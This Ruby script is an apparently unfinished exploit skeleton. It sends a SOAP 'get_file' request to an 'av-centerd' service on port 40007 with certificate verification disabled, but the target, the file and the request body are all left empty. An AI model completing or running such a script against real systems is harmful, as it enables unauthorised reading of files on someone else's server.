#! /usr/bin/env ruby

require 'net/http'
require 'net/https'
require 'uri'

target = ''
file = ''

def soapRequest(target, file)
end

def main(target, file)
	uri = URI.parse("https://#{target}")
	http = Net::HTTP.new(uri.host, 40007)
	http.use_ssl = true
	http.verify_mode = OpenSSL::SSL::VERIFY_NONE

	req = Net::HTTP::Post.new("/av-centerd")
	req.initialize_http_header({
		'Content-Type'	=>	'text/xml; charset=UTF-8',
		'SOAPAction'		=>	'"AV/CC/Util#get_file"'
	})
	req.body = soapRequest(target, file)

	res = http.request(req)
end

main(target, file)